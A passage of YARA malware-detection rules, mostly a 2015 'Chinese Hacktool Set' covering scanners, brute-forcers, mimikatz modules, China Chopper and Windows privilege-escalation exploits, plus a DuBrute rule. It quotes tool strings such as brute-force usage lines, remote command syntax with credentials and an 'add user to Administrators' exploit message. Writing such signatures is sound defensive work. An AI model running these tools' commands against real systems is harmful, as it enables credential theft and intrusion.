		hash = "17a743e40790985ececf5c66eaad2a1f8c4cffe8"
	strings:
		$s1 = "%s -f hosts.txt -port -ipc -pop -max 300,20 -time 10000" fullword ascii
		$s2 = "%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,20" fullword ascii
		$s3 = "%s -h www.target.com -all" fullword ascii
		$s4 = ".\\report\\%s-%s.html" fullword ascii
		$s5 = ".\\log\\Hscan.log" fullword ascii
		$s6 = "[%s]: Found cisco Enable password: %s !!!" fullword ascii
		$s7 = "%s@ftpscan#FTP Account:  %s/[null]" fullword ascii
		$s8 = ".\\conf\\mysql_pass.dic" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and all of them
}

rule GoodToolset_pr {
	meta:
		description = "Chinese Hacktool Set - file pr.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "f6676daf3292cff59ef15ed109c2d408369e8ac8"
	strings:
		$s1 = "-->Got WMI process Pid: %d " ascii
		$s2 = "-->This exploit gives you a Local System shell " ascii
		$s3 = "wmiprvse.exe" fullword ascii
		$s4 = "Try the first %d time" fullword ascii
		$s5 = "-->Build&&Change By p " ascii
		$s6 = "root\\MicrosoftIISv2" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and all of them
}

rule hydra_7_4_1_hydra {
	meta:
		description = "Chinese Hacktool Set - file hydra.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "3411d0380a1c1ebf58a454765f94d4f1dd714b5b"
	strings:
		$s1 = "%d of %d target%s%scompleted, %lu valid password%s found" fullword ascii
		$s2 = "[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD" fullword ascii
		$s3 = "hydra -P pass.txt target cisco-enable  (direct console access)" fullword ascii
		$s4 = "[%d][smb] Host: %s Account: %s Error: PASSWORD EXPIRED" fullword ascii
		$s5 = "[ERROR] SMTP LOGIN AUTH, either this auth is disabled" fullword ascii
		$s6 = "\"/login.php:user=^USER^&pass=^PASS^&mid=123:incorrect\"" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them
}

rule CN_Tools_srss_2 {
	meta:
		description = "Chinese Hacktool Set - file srss.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "c418b30d004051bbf1b2d3be426936b95b5fea6f"
	strings:
		$x1 = "used pepack!" fullword ascii

		$s1 = "KERNEL32.dll" fullword ascii
		$s2 = "KERNEL32.DLL" fullword ascii
		$s3 = "LoadLibraryA" fullword ascii
		$s4 = "GetProcAddress" fullword ascii
		$s5 = "VirtualProtect" fullword ascii
		$s6 = "VirtualAlloc" fullword ascii
		$s7 = "VirtualFree" fullword ascii
		$s8 = "ExitProcess" fullword ascii
	condition:
		uint16(0) == 0x5a4d and ( $x1 at 0 ) and filesize < 14KB and all of ($s*)
}

rule Dos_NtGod {
	meta:
		description = "Chinese Hacktool Set - file NtGod.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "adefd901d6bbd8437116f0170b9c28a76d4a87bf"
	strings:
		$s0 = "\\temp\\NtGodMode.exe" ascii
		$s4 = "NtGodMode.exe" fullword ascii
		$s10 = "ntgod.bat" fullword ascii
		$s19 = "sfxcmd" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 250KB and all of them
}

rule CN_Tools_VNCLink {
	meta:
		description = "Chinese Hacktool Set - file VNCLink.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "cafb531822cbc0cfebbea864489eebba48081aa1"
	strings:
		$s1 = "C:\\temp\\vncviewer4.log" fullword ascii
		$s2 = "[BL4CK] Patched by redsand || http://blacksecurity.org" fullword ascii
		$s3 = "fake release extendedVkey 0x%x, keysym 0x%x" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 580KB and 2 of them
}

rule tools_NTCmd {
	meta:
		description = "Chinese Hacktool Set - file NTCmd.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "a3ae8659b9a673aa346a60844208b371f7c05e3c"
	strings:
		$s1 = "pipecmd \\\\%s -U:%s -P:\"\" %s" fullword ascii
		$s2 = "[Usage]:  %s <HostName|IP> <Username> <Password>" fullword ascii
		$s3 = "pipecmd \\\\%s -U:%s -P:%s %s" fullword ascii
		$s4 = "============By uhhuhy (Feb 18,2003) - http://www.cnhonker.net============" fullword ascii /* PEStudio Blacklist: os */
		$s5 = "=======================NTcmd v0.11 for HScan v1.20=======================" fullword ascii
		$s6 = "NTcmd>" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 80KB and 2 of them
}

rule mysql_pwd_crack {
	meta:
		description = "Chinese Hacktool Set - file mysql_pwd_crack.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "57d1cb4d404688804a8c3755b464a6e6248d1c73"
	strings:
		$s1 = "mysql_pwd_crack 127.0.0.1 -x 3306 -p root -d userdict.txt" fullword ascii
		$s2 = "Successfully --> username %s password %s " fullword ascii
		$s3 = "zhouzhen@gmail.com http://zhouzhen.eviloctal.org" fullword ascii
		$s4 = "-a automode  automatic crack the mysql password " fullword ascii
		$s5 = "mysql_pwd_crack 127.0.0.1 -x 3306 -a" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 1 of them
}

rule CmdShell64 {
	meta:
		description = "Chinese Hacktool Set - file CmdShell64.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "5b92510475d95ae5e7cd6ec4c89852e8af34acf1"
	strings:
		$s1 = "C:\\Windows\\System32\\JAVASYS.EXE" fullword wide
		$s2 = "ServiceCmdShell" fullword ascii
		$s3 = "<!-- If your application is designed to work with Windows 8.1, uncomment the fol" ascii
		$s4 = "ServiceSystemShell" fullword wide
		$s5 = "[Root@CmdShell ~]#" fullword wide
		$s6 = "Hello Man 2015 !" fullword wide
		$s7 = "CmdShell" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 30KB and 4 of them
}

rule Ms_Viru_v {
	meta:
		description = "Chinese Hacktool Set - file v.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "ecf4ba6d1344f2f3114d52859addee8b0770ed0d"
	strings:
		$s1 = "c:\\windows\\system32\\command.com /c " fullword ascii
		$s2 = "Easy Usage Version -- Edited By: racle@tian6.com" fullword ascii
		$s3 = "OH,Sry.Too long command." fullword ascii
		$s4 = "Success! Commander." fullword ascii
		$s5 = "Hey,how can racle work without ur command ?" fullword ascii
		$s6 = "The exploit thread was unable to map the virtual 8086 address space" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 3 of them
}

rule CN_Tools_Vscan {
	meta:
		description = "Chinese Hacktool Set - file Vscan.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "0365fe05e2de0f327dfaa8cd0d988dbb7b379612"
	strings:
		$s1 = "[+] Usage: VNC_bypauth <target> <scantype> <option>" fullword ascii
		$s2 = "========RealVNC <= 4.1.1 Bypass Authentication Scanner=======" fullword ascii
		$s3 = "[+] Type VNC_bypauth <target>,<scantype> or <option> for more informations" fullword ascii
		$s4 = "VNC_bypauth -i 192.168.0.1,192.168.0.2,192.168.0.3,..." fullword ascii
		$s5 = "-vn:%-15s:%-7d  connection closed" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 60KB and 2 of them
}

rule Dos_iis {
	meta:
		description = "Chinese Hacktool Set - file iis.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "61ffd2cbec5462766c6f1c44bd44eeaed4f3d2c7"
	strings:
		$s1 = "comspec" fullword ascii
		$s2 = "program terming" fullword ascii
		$s3 = "WinSta0\\Defau" fullword ascii
		$s4 = "* FROM IIsWebInfo" ascii
		$s5 = "www.icehack." ascii
		$s6 = "wmiprvse.exe" fullword ascii
		$s7 = "Pid: %d" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 70KB and all of them
}

rule IISPutScannesr {
	meta:
		description = "Chinese Hacktool Set - file IISPutScannesr.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "2dd8fee20df47fd4eed5a354817ce837752f6ae9"
	strings:
		$s1 = "yoda & M.o.D." ascii
		$s2 = "-> come.to/f2f **************" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and all of them
}

rule Generate {
	meta:
		description = "Chinese Hacktool Set - file Generate.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "2cb4c3916271868c30c7b4598da697f59e9c7a12"
	strings:
		$s1 = "C:\\TEMP\\" fullword ascii
		$s2 = "Connection Closed Gracefully.;Could not bind socket. Address and port are alread" wide
		$s3 = "$530 Please login with USER and PASS." fullword ascii
		$s4 = "_Shell.exe" fullword ascii
		$s5 = "ftpcWaitingPassword" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2000KB and 3 of them
}

rule Pc_rejoice {
	meta:
		description = "Chinese Hacktool Set - file rejoice.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "fe634a9f5d48d5c64c8f8bfd59ac7d8965d8f372"
	strings:
		$s1 = "@members.3322.net/dyndns/update?system=dyndns&hostname=" fullword ascii
		$s2 = "http://www.xxx.com/xxx.exe" fullword ascii
		$s3 = "@ddns.oray.com/ph/update?hostname=" fullword ascii
		$s4 = "No data to read.$Can not bind in port range (%d - %d)" fullword wide
		$s5 = "ListViewProcessListColumnClick!" fullword ascii
		$s6 = "http://iframe.ip138.com/ic.asp" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and 3 of them
}

rule ms11080_withcmd {
	meta:
		description = "Chinese Hacktool Set - file ms11080_withcmd.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "745e5058acff27b09cfd6169caf6e45097881a49"
	strings:
		$s1 = "Usage : ms11-080.exe cmd.exe Command " fullword ascii
		$s2 = "\\ms11080\\ms11080\\Debug\\ms11080.pdb" fullword ascii
		$s3 = "[>] by:Mer4en7y@90sec.org" fullword ascii
		$s4 = "[>] create porcess error" fullword ascii
		$s5 = "[>] ms11-080 Exploit" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and 1 of them
}

rule OtherTools_xiaoa {
	meta:
		description = "Chinese Hacktool Set - file xiaoa.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "6988acb738e78d582e3614f83993628cf92ae26d"
	strings:
		$s1 = "Usage:system_exp.exe \"cmd\"" fullword ascii
		$s2 = "The shell \"cmd\" success!" fullword ascii
		$s3 = "Not Windows NT family OS." fullword ascii /* PEStudio Blacklist: os */
		$s4 = "Unable to get kernel base address." fullword ascii
		$s5 = "run \"%s\" failed,code: %d" fullword ascii
		$s6 = "Windows Kernel Local Privilege Exploit " fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 2 of them
}

rule unknown2 {
	meta:
		description = "Chinese Hacktool Set - file unknown2.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "32508d75c3d95e045ddc82cb829281a288bd5aa3"
	strings:
		$s1 = "http://md5.com.cn/index.php/md5reverse/index/md/" fullword wide
		$s2 = "http://www.md5decrypter.co.uk/feed/api.aspx?" fullword wide
		$s3 = "http://www.md5.com.cn" fullword wide
		$s4 = "1.5.exe" fullword wide
		$s5 = "\\Set.ini" fullword wide
		$s6 = "OpenFileDialog1" fullword wide
		$s7 = " (*.txt)|*.txt" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and 4 of them
}

rule hydra_7_3_hydra {
	meta:
		description = "Chinese Hacktool Set - file hydra.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "2f82b8bf1159e43427880d70bcd116dc9e8026ad"
	strings:
		$s1 = "[ATTEMPT-ERROR] target %s - login \"%s\" - pass \"%s\" - child %d - %lu of %lu" fullword ascii
		$s2 = "(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=))(COMMAND=reload)(PASSWORD=%s)(SERVICE" ascii
		$s3 = "cn=^USER^,cn=users,dc=foo,dc=bar,dc=com for domain foo.bar.com" fullword ascii
		$s4 = "[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD" fullword ascii
		$s5 = "hydra -P pass.txt target cisco-enable  (direct console access)" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 700KB and 1 of them
}

rule OracleScan {
	meta:
		description = "Chinese Hacktool Set - file OracleScan.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "10ff7faf72fe6da8f05526367b3522a2408999ec"
	strings:
		$s1 = "MYBLOG:HTTP://HI.BAIDU.COM/0X24Q" fullword ascii
		$s2 = "\\Borland\\Delphi\\RTL" fullword ascii
		$s3 = "USER_NAME" ascii
		$s4 = "FROMWWHERE" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and all of them
}

rule SQLTools {
	meta:
		description = "Chinese Hacktool Set - file SQLTools.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "38a9caa2079afa2c8d7327e7762f7ed9a69056f7"
	strings:
		$s1 = "DBN_POST" fullword wide
		$s2 = "LOADER ERROR" fullword ascii
		$s3 = "www.1285.net" fullword wide
		$s4 = "TUPFILEFORM" fullword wide
		$s5 = "DBN_DELETE" fullword wide
		$s6 = "DBINSERT" fullword wide
		$s7 = "Copyright (C) Kibosoft Corp. 2001-2006" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 2350KB and all of them
}

rule portscanner {
	meta:
		description = "Chinese Hacktool Set - file portscanner.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "1de367d503fdaaeee30e8ad7c100dd1e320858a4"
	strings:
		$s0 = "PortListfNo" fullword ascii
		$s1 = ".533.net" fullword ascii
		$s2 = "CRTDLL.DLL" fullword ascii
		$s3 = "exitfc" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 25KB and all of them
}

rule kappfree {
	meta:
		description = "Chinese Hacktool Set - file kappfree.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "e57e79f190f8a24ca911e6c7e008743480c08553"
	strings:
		$s1 = "Bienvenue dans un processus distant" fullword wide
		$s2 = "kappfree.dll" fullword ascii
		$s3 = "kappfree de mimikatz pour Windows (anti AppLocker)" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and all of them
}

rule Smartniff {
	meta:
		description = "Chinese Hacktool Set - file Smartniff.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "67609f21d54a57955d8fe6d48bc471f328748d0a"
	strings:
		$s1 = "smsniff.exe" fullword wide
		$s2 = "support@nirsoft.net0" fullword ascii
		$s3 = "</requestedPrivileges></security></trustInfo></assembly>" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and all of them
}

rule ChinaChopper_caidao {
	meta:
		description = "Chinese Hacktool Set - file caidao.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "056a60ec1f6a8959bfc43254d97527b003ae5edb"
	strings:
		$s1 = "Pass,Config,n{)" fullword ascii
		$s2 = "phMYSQLZ" fullword ascii
		$s3 = "\\DHLP\\." fullword ascii
		$s4 = "\\dhlp\\." fullword ascii
		$s5 = "SHAutoComple" fullword ascii
		$s6 = "MainFrame" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1077KB and all of them
}

rule KiwiTaskmgr_2 {
	meta:
		description = "Chinese Hacktool Set - file KiwiTaskmgr.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16"
	strings:
		$s1 = "Process Ok, Memory Ok, resuming process :)" fullword wide
		$s2 = "Kiwi Taskmgr no-gpo" fullword wide
		$s3 = "KiwiAndTaskMgr" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and all of them
}

rule kappfree_2 {
	meta:
		description = "Chinese Hacktool Set - file kappfree.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "5d578df9a71670aa832d1cd63379e6162564fb6b"
	strings:
		$s1 = "kappfree.dll" fullword ascii
		$s2 = "kappfree de mimikatz pour Windows (anti AppLocker)" fullword wide
		$s3 = "' introuvable !" fullword wide
		$s4 = "kiwi\\mimikatz" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and 2 of them
}

rule x_way2_5_sqlcmd {
	meta:
		description = "Chinese Hacktool Set - file sqlcmd.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "5152a57e3638418b0d97a42db1c0fc2f893a2794"
	strings:
		$s1 = "LOADER ERROR" fullword ascii
		$s2 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
		$s3 = "The ordinal %u could not be located in the dynamic link library %s" fullword ascii
		$s4 = "kernel32.dll" fullword ascii
		$s5 = "VirtualAlloc" fullword ascii
		$s6 = "VirtualFree" fullword ascii
		$s7 = "VirtualProtect" fullword ascii
		$s8 = "ExitProcess" fullword ascii
		$s9 = "user32.dll" fullword ascii
		$s16 = "MessageBoxA" fullword ascii
		$s10 = "wsprintfA" fullword ascii
		$s11 = "kernel32.dll" fullword ascii
		$s12 = "GetProcAddress" fullword ascii
		$s13 = "GetModuleHandleA" fullword ascii
		$s14 = "LoadLibraryA" fullword ascii
		$s15 = "odbc32.dll" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 23KB and filesize > 20KB and all of them
}

rule Win32_klock {
	meta:
		description = "Chinese Hacktool Set - file klock.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "7addce4434670927c4efaa560524680ba2871d17"
	strings:
		$s1 = "klock.dll" fullword ascii
		$s2 = "Erreur : impossible de basculer le bureau ; SwitchDesktop : " fullword wide
		$s3 = "klock de mimikatz pour Windows" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 250KB and all of them
}

rule ipsearcher {
	meta:
		description = "Chinese Hacktool Set - file ipsearcher.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "1e96e9c5c56fcbea94d26ce0b3f1548b224a4791"
	strings:
		$s0 = "http://www.wzpg.com" fullword ascii
		$s1 = "ipsearcher\\ipsearcher\\Release\\ipsearcher.pdb" fullword ascii
		$s3 = "_GetAddress" fullword ascii
		$s5 = "ipsearcher.dll" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 140KB and all of them
}

rule ms10048_x64 {
	meta:
		description = "Chinese Hacktool Set - file ms10048-x64.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "418bec3493c85e3490e400ecaff5a7760c17a0d0"
	strings:
		$s1 = "The target is most likely patched." fullword ascii
		$s2 = "Dojibiron by Ronald Huizer, (c) master#h4cker.us  " fullword ascii
		$s3 = "[ ] Creating evil window" fullword ascii
		$s4 = "[+] Set to %d exploit half succeeded" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 40KB and 1 of them
}

rule hscangui {
	meta:
		description = "Chinese Hacktool Set - file hscangui.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "af8aced0a78e1181f4c307c78402481a589f8d07"
	strings:
		$s1 = "[%s]: Found \"FTP account: anyone/anyone@any.net\"  !!!" fullword ascii
		$s2 = "http://www.cnhonker.com" fullword ascii
		$s3 = "%s@ftpscan#Cracked account:  %s/%s" fullword ascii
		$s4 = "[%s]: Found \"FTP account: %s/%s\" !!!" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 220KB and 2 of them
}

rule GoodToolset_ms11080 {
	meta:
		description = "Chinese Hacktool Set - file ms11080.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "f0854c49eddf807f3a7381d3b20f9af4a3024e9f"
	strings:
		$s1 = "[*] command add user 90sec 90sec" fullword ascii
		$s2 = "\\ms11080\\Debug\\ms11080.pdb" fullword ascii
		$s3 = "[>] by:Mer4en7y@90sec.org" fullword ascii
		$s4 = "[*] Add to Administrators success" fullword ascii
		$s5 = "[*] User has been successfully added" fullword ascii
		$s6 = "[>] ms11-08 Exploit" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 240KB and 2 of them
}

rule epathobj_exp64 {
	meta:
		description = "Chinese Hacktool Set - file epathobj_exp64.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "09195ba4e25ccce35c188657957c0f2c6a61d083"
	strings:
		$s1 = "Watchdog thread %d waiting on Mutex" fullword ascii
		$s2 = "Exploit ok run command" fullword ascii
		$s3 = "\\epathobj_exp\\x64\\Release\\epathobj_exp.pdb" fullword ascii
		$s4 = "Alllocated userspace PATHRECORD () %p" fullword ascii
		$s5 = "Mutex object did not timeout, list not patched" fullword ascii
		$s6 = "- inconsistent onexit begin-end variables" fullword wide  /* Goodware String - occured 96 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 150KB and 2 of them
}

rule kelloworld_2 {
	meta:
		description = "Chinese Hacktool Set - file kelloworld.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "55d5dabd96c44d16e41f70f0357cba1dda26c24f"
	strings:
		$s1 = "Hello World!" fullword wide
		$s2 = "kelloworld.dll" fullword ascii
		$s3 = "kelloworld de mimikatz pour Windows" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and all of them
}

rule HScan_v1_20_hscan {
	meta:
		description = "Chinese Hacktool Set - file hscan.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "568b06696ea0270ee1a744a5ac16418c8dacde1c"
	strings:
		$s1 = "[%s]: Found \"FTP account: anyone/anyone@any.net\"  !!!" fullword ascii
		$s2 = "%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,100" fullword ascii
		$s3 = ".\\report\\%s-%s.html" fullword ascii
		$s4 = ".\\log\\Hscan.log" fullword ascii
		$s5 = "[%s]: Found cisco Enable password: %s !!!" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and 2 of them
}

rule _Project1_Generate_rejoice {
	meta:
		description = "Chinese Hacktool Set - from files Project1.exe, Generate.exe, rejoice.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		super_rule = 1
		hash0 = "d1a5e3b646a16a7fcccf03759bd0f96480111c96"
		hash1 = "2cb4c3916271868c30c7b4598da697f59e9c7a12"
		hash2 = "fe634a9f5d48d5c64c8f8bfd59ac7d8965d8f372"
	strings:
		$s1 = "sfUserAppDataRoaming" fullword ascii
		$s2 = "$TRzFrameControllerPropertyConnection" fullword ascii
		$s3 = "delphi32.exe" fullword ascii
		$s4 = "hkeyCurrentUser" fullword ascii
		$s5 = "%s is not a valid IP address." fullword wide
		$s6 = "Citadel hooking error" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2000KB and all of them
}

rule _hscan_hscan_hscangui {
	meta:
		description = "Chinese Hacktool Set - from files hscan.exe, hscan.exe, hscangui.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		super_rule = 1
		hash0 = "17a743e40790985ececf5c66eaad2a1f8c4cffe8"
		hash1 = "568b06696ea0270ee1a744a5ac16418c8dacde1c"
		hash2 = "af8aced0a78e1181f4c307c78402481a589f8d07"
	strings:
		$s1 = ".\\log\\Hscan.log" fullword ascii
		$s2 = ".\\report\\%s-%s.html" fullword ascii
		$s3 = "[%s]: checking \"FTP account: ftp/ftp@ftp.net\" ..." fullword ascii
		$s4 = "[%s]: IPC NULL session connection success !!!" fullword ascii
		$s5 = "Scan %d targets,use %4.1f minutes" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 240KB and all of them
}

rule kiwi_tools {
	meta:
		description = "Chinese Hacktool Set - from files kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, mimikatz.sys, sekurlsa.dll, kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, mimikatz.sys, sekurlsa.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		super_rule = 1
		hash0 = "e57e79f190f8a24ca911e6c7e008743480c08553"
		hash1 = "55d5dabd96c44d16e41f70f0357cba1dda26c24f"
		hash2 = "7ac7541e20af7755b7d8141c5c1b7432465cabd8"
		hash3 = "9fbfe3eb49d67347ab57ae743f7542864bc06de6"
		hash4 = "5c90d648c414bdafb549291f95fe6f27c0c9b5ec"
		hash5 = "7addce4434670927c4efaa560524680ba2871d17"
		hash6 = "28c5c0bdb7786dc2771672a2c275be7d9b742ec7"
		hash7 = "b5c93489a1b62181594d0fb08cc510d947353bc8"
		hash8 = "6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5"
		hash9 = "5d578df9a71670aa832d1cd63379e6162564fb6b"
		hash10 = "febadc01a64a071816eac61a85418711debaf233"
		hash11 = "569ca4ff1a5ea537aefac4a04a2c588c566c6d86"
		hash12 = "56a61c808b311e2225849d195bbeb69733efe49a"
		hash13 = "8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16"
		hash14 = "44825e848bc3abdb6f31d0a49725bb6f498e9ccc"
		hash15 = "f661d6516d081c37ab7da0f4ec21b2cc6a9257c6"
		hash16 = "20facf1fa2d87cccf177403ca1a7852128a9a0ab"
		hash17 = "6e0ffa472d63fdda5abc4c1b164ba8724dcb25b5"
	strings:
		$s1 = "http://blog.gentilkiwi.com/mimikatz" ascii
		$s2 = "Benjamin Delpy" fullword ascii
		$s3 = "GlobalSign" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}

rule kiwi_tools_gentil_kiwi {
	meta:
		description = "Chinese Hacktool Set - from files kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, sekurlsa.dll, kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, sekurlsa.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		super_rule = 1
		hash0 = "e57e79f190f8a24ca911e6c7e008743480c08553"
		hash1 = "55d5dabd96c44d16e41f70f0357cba1dda26c24f"
		hash2 = "7ac7541e20af7755b7d8141c5c1b7432465cabd8"
		hash3 = "9fbfe3eb49d67347ab57ae743f7542864bc06de6"
		hash4 = "5c90d648c414bdafb549291f95fe6f27c0c9b5ec"
		hash5 = "7addce4434670927c4efaa560524680ba2871d17"
		hash6 = "28c5c0bdb7786dc2771672a2c275be7d9b742ec7"
		hash7 = "6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5"
		hash8 = "5d578df9a71670aa832d1cd63379e6162564fb6b"
		hash9 = "febadc01a64a071816eac61a85418711debaf233"
		hash10 = "569ca4ff1a5ea537aefac4a04a2c588c566c6d86"
		hash11 = "56a61c808b311e2225849d195bbeb69733efe49a"
		hash12 = "8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16"
		hash13 = "44825e848bc3abdb6f31d0a49725bb6f498e9ccc"
		hash14 = "f661d6516d081c37ab7da0f4ec21b2cc6a9257c6"
		hash15 = "6e0ffa472d63fdda5abc4c1b164ba8724dcb25b5"
	strings:
		$s1 = "mimikatz" fullword wide
		$s2 = "Copyright (C) 2012 Gentil Kiwi" fullword wide
		$s3 = "Gentil Kiwi" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}
rule dubrute : bruteforcer toolkit
{
    meta:
        author = "Christian Rebischke (@sh1bumi)"
        date = "2015-09-05"
        description = "Rules for DuBrute Bruteforcer"
        in_the_wild = true
        family = "Hackingtool/Bruteforcer"
    
    strings:
        $a = "WBrute"
        $b = "error.txt"
        $c = "good.txt"
        $d = "source.txt"
        $e = "bad.txt"
        $f = "Generator IP@Login;Password"

    condition:
        //check for MZ Signature at offset 0
        uint16(0) == 0x5A4D 

        and 

        //check for dubrute specific strings
        $a and $b and $c and $d and $e and $f 
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-01-15
	Identifier: Exe2hex
*/

rule Payload_Exe2Hex : toolkit {
	meta:
		description = "Detects payload generated by exe2hex"
		author = "Florian Roth"
		reference = "https://github.com/g0tmi1k/exe2hex"
		date = "2016-01-15"
		score = 70
	strings:
